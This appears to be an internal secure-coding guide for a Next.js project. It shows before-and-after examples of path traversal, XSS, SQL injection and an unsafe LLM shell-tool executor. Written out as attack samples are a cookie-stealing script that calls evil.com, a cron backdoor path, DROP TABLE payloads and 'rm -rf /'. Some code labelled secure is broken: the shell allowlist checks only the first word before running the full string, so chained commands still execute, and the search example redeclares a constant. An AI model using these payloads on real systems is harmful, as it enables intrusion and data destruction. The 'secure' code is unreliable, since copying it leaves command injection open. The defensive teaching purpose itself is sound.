# Security Implementation Examples

Quick examples showing how to secure existing Scorpion code.

## Example 1: Securing a File Upload API

### Before (Vulnerable)

```typescript
// ❌ VULNERABLE TO DIRECTORY TRAVERSAL
export async function POST(request: NextRequest) {
  const formData = await request.formData();
  const file = formData.get('file') as File;
  const filename = file.name;

  // User controls the path!
  const uploadPath = path.join(process.cwd(), 'uploads', filename);
  await fs.writeFile(uploadPath, Buffer.from(await file.arrayBuffer()));

  return NextResponse.json({ success: true, filename });
}
```

**Attack:** Upload a file named `../../../etc/cron.d/backdoor` to gain persistence.

### After (Secure)

```typescript
// ✅ SECURE
import { validateFilename, resolveSafePath } from '@/lib/security';
import { withSecurity } from '@/lib/security/middleware';
import { z } from 'zod';

export const POST = withSecurity(
  {
    rateLimit: { windowMs: 60000, maxRequests: 10 }, // 10 uploads per minute
  },
  async (request: NextRequest) => {
    const formData = await request.formData();
    const file = formData.get('file') as File;

    // Validate filename
    if (!validateFilename(file.name, {
      allowedExtensions: ['.pdf', '.jpg', '.png', '.txt'],
      maxLength: 100,
    })) {
      return NextResponse.json(
        { error: 'Invalid filename' },
        { status: 400 }
      );
    }

    // Generate safe path
    const rootDir = path.resolve(process.cwd(), 'uploads');
    const safeFilename = `${Date.now()}-${file.name}`; // Add timestamp prefix
    const uploadPath = resolveSafePath(rootDir, safeFilename);

    // Save file
    await fs.writeFile(uploadPath, Buffer.from(await file.arrayBuffer()));

    // Store metadata in DB (map ID to path)
    const record = await db.file.create({
      data: {
        id: crypto.randomUUID(),
        name: file.name,
        absolutePath: uploadPath,
        mimeType: file.type,
        size: file.size,
      },
    });

    return NextResponse.json({
      success: true,
      id: record.id, // Return ID, not path
    });
  }
);
```

---

## Example 2: Securing a Chat Message API

### Before (Vulnerable)

```typescript
// ❌ VULNERABLE TO XSS
export async function POST(request: NextRequest) {
  const { message, conversationId } = await request.json();

  // Store raw user input
  await db.message.create({
    data: { content: message, conversationId },
  });

  return NextResponse.json({ success: true });
}

// Later, in the UI:
// ❌ XSS when rendering
<div dangerouslySetInnerHTML={{ __html: message.content }} />
```

**Attack:** Send message `<script>fetch('https://evil.com?c='+document.cookie)</script>` to steal cookies.

### After (Secure)

```typescript
// ✅ SECURE
import { withSecurity } from '@/lib/security/middleware';
import { sanitizeChatMessage } from '@/lib/security/sanitize';
import { z } from 'zod';

const chatSchema = z.object({
  message: z.string().min(1).max(10000),
  conversationId: z.string().uuid(),
});

export const POST = withSecurity(
  {
    rateLimit: { windowMs: 60000, maxRequests: 50 },
    bodySchema: chatSchema,
  },
  async (request: NextRequest) => {
    const { message, conversationId } = await request.json();

    // Sanitize before storing
    const sanitized = sanitizeChatMessage(message);

    await db.message.create({
      data: { content: sanitized, conversationId },
    });

    return NextResponse.json({ success: true });
  }
);

// In the UI:
// ✅ SAFE - React escapes by default
<div>{message.content}</div>

// Or if you need some HTML formatting:
import { sanitizeHtml } from '@/lib/security/sanitize';

<div dangerouslySetInnerHTML={{
  __html: sanitizeHtml(message.content, {
    allowedTags: ['p', 'strong', 'em', 'code'],
  })
}} />
```

---

## Example 3: Securing a Database Search API

### Before (Vulnerable)

```typescript
// ❌ VULNERABLE TO SQL INJECTION
export async function GET(request: NextRequest) {
  const { searchParams } = new URL(request.url);
  const query = searchParams.get('q');

  // SQL injection vulnerability!
  const results = await db.$queryRaw`
    SELECT * FROM workflows
    WHERE name LIKE '%${query}%'
  `;

  return NextResponse.json({ results });
}
```

**Attack:** `?q='; DROP TABLE workflows; --` to delete data.

### After (Secure)

```typescript
// ✅ SECURE
import { withSecurity } from '@/lib/security/middleware';
import { escapeSqlLike, SecuritySchemas } from '@/lib/security';
import { z } from 'zod';

const searchSchema = z.object({
  q: z.string().min(1).max(100),
});

export const GET = withSecurity(
  {
    querySchema: searchSchema,
    rateLimit: { windowMs: 60000, maxRequests: 100 },
  },
  async (request: NextRequest) => {
    const { searchParams } = new URL(request.url);
    const query = searchParams.get('q')!;

    // Option 1: Use Prisma (safest)
    const results = await prisma.workflow.findMany({
      where: {
        name: {
          contains: query, // Prisma handles escaping
        },
      },
    });

    // Option 2: If you must use raw SQL
    const escaped = escapeSqlLike(query);
    const results = await db.$queryRaw`
      SELECT * FROM workflows
      WHERE name LIKE ${'%' + escaped + '%'}
    `;

    return NextResponse.json({ results });
  }
);
```

---

## Example 4: Securing an LLM Tool Executor

### Before (Vulnerable)

```typescript
// ❌ VULNERABLE - LLM CAN RUN ARBITRARY COMMANDS
export async function POST(request: NextRequest) {
  const { toolName, args } = await request.json();

  // Execute whatever the LLM asks for
  if (toolName === 'executeShell') {
    const result = await exec(args.command);
    return NextResponse.json({ result });
  }

  if (toolName === 'readFile') {
    const data = await fs.readFile(args.path, 'utf-8');
    return NextResponse.json({ data });
  }

  return NextResponse.json({ error: 'Unknown tool' });
}
```

**Attack:** LLM generates `{ toolName: 'executeShell', args: { command: 'rm -rf /' } }`

### After (Secure)

```typescript
// ✅ SECURE
import { validateToolCall } from '@/lib/security';
import { withSecurity } from '@/lib/security/middleware';
import { z } from 'zod';

const toolCallSchema = z.object({
  toolName: z.enum(['executeShell', 'readFile', 'writeFile']),
  args: z.record(z.any()),
});

export const POST = withSecurity(
  {
    bodySchema: toolCallSchema,
    rateLimit: { windowMs: 60000, maxRequests: 50 },
  },
  async (request: NextRequest) => {
    const { toolName, args } = await request.json();

    // Validate tool call safety
    const validation = validateToolCall({ name: toolName, args });
    if (!validation.safe) {
      return NextResponse.json(
        { error: 'Blocked unsafe tool call', reason: validation.reason },
        { status: 403 }
      );
    }

    // Log all tool executions
    await db.toolExecution.create({
      data: {
        toolName,
        args: JSON.stringify(args),
        timestamp: new Date(),
      },
    });

    // Execute with additional safety
    if (toolName === 'executeShell') {
      // Whitelist allowed commands
      const allowedCommands = ['ls', 'pwd', 'echo', 'date'];
      const cmd = args.command.split(' ')[0];

      if (!allowedCommands.includes(cmd)) {
        return NextResponse.json(
          { error: 'Command not allowed' },
          { status: 403 }
        );
      }

      const result = await exec(args.command);
      return NextResponse.json({ result });
    }

    if (toolName === 'readFile') {
      // Use ID-based lookup instead of direct path
      const record = await db.file.findUnique({
        where: { id: args.fileId },
      });

      if (!record) {
        return NextResponse.json({ error: 'File not found' }, { status: 404 });
      }

      const data = await fs.readFile(record.absolutePath, 'utf-8');
      return NextResponse.json({ data });
    }

    return NextResponse.json({ error: 'Unknown tool' });
  }
);
```

---

## Example 5: Adding Security to Existing Routes

If you have an existing API route, you can wrap it:

```typescript
// Before
export async function POST(request: NextRequest) {
  // ... your existing logic
}

// After - Add security with minimal changes
import { withSecurity } from '@/lib/security/middleware';
import { z } from 'zod';

const schema = z.object({
  // Define your expected input
  name: z.string().min(1).max(100),
  email: z.string().email(),
});

export const POST = withSecurity(
  {
    bodySchema: schema,
    rateLimit: { windowMs: 60000, maxRequests: 100 },
  },
  async (request: NextRequest) => {
    // Your existing logic - now with validation!
    const body = await request.json();
    // ... rest of your code
  }
);
```

---

## Testing Your Security

After implementing security controls, verify them:

```bash
# Run security tests
pnpm test tests/security

# Manual testing
curl "http://localhost:3000/api/files?file=../../../etc/passwd"
# Should return: 400 Invalid filename

curl -X POST http://localhost:3000/api/chat \
  -H "Content-Type: application/json" \
  -d '{"message":"<script>alert(1)</script>"}'
# Should sanitize the script tag

curl -X POST http://localhost:3000/api/search \
  -H "Content-Type: application/json" \
  -d '{"query":"'; DROP TABLE users; --"}'
# Should be safely escaped
```

---

## Migration Checklist

For each API route in Scorpion:

- [ ] Add input validation (Zod schema)
- [ ] Add rate limiting
- [ ] Sanitize user content before storage
- [ ] Use parameterized queries for DB
- [ ] Validate file paths with `validateFilename()`
- [ ] Sanitize HTML before rendering
- [ ] Log security-sensitive operations
- [ ] Add security tests
- [ ] Review with Security Council

---

## Quick Wins

**Priority 1 (Do First):**
1. Fix the screenshot endpoint ✅ (Already done!)
2. Add security headers ✅ (Already done!)
3. Sanitize chat messages
4. Validate file uploads

**Priority 2 (Do Soon):**
1. Add rate limiting to all public APIs
2. Validate tool executions
3. Add comprehensive tests

**Priority 3 (Do Eventually):**
1. Implement CSP nonces
2. Add security monitoring/alerting
3. Conduct penetration testing
4. Set up security audit logging

---

## Need Help?

- See [SECURITY.md](./SECURITY.md) for full guidelines
- Check [lib/security/](./lib/security/) for available utilities
- Run tests: `pnpm test tests/security`
- Ask in `#security` channel
